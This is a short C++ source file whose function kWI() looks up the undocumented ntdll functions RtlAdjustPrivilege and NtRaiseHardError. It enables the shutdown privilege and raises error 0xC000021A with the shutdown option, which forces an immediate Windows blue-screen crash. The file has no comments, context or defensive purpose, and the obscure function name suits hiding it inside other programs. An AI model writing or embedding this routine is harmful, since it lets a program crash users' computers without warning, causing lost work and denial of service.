#include <windows.h>
#include "crash.h"

void kWI() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return;

    auto RtlAdjustPrivilege = (LONG(WINAPI*)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN))GetProcAddress(ntdll, "RtlAdjustPrivilege");
    auto NtRaiseHardError  = (LONG(WINAPI*)(LONG, ULONG, ULONG, PULONG_PTR, ULONG, PULONG))GetProcAddress(ntdll, "NtRaiseHardError");

    if (RtlAdjustPrivilege && NtRaiseHardError) {
        BOOLEAN out1; ULONG out2;
        RtlAdjustPrivilege(19, TRUE, FALSE, &out1);
        NtRaiseHardError(0xC000021A, 0, 0, nullptr, 6, &out2);
    }
}